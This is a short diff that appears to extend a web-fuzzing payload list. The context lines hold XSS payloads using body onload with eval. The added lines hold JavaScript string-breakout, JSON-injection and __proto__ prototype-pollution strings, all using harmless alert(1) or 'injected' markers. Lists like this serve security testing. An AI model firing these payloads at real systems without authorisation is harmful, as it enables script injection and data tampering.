@@ -18,4 +18,10 @@
 "onload":"alert(1)"
 <body onload="var a={x:eval};a.x('alert(1)')">
 <body onload="a={x:this.parent.document};a.x.write(1)">
+"));alert(1);//"
+"},"injected":1,"x":"1
+"}]},{"injected":true,"x":"1
+","injected":true,"x":"1
+"__proto__":{"polluted":1}
+"}]});/*json*/(function(){return 1;})()//
 
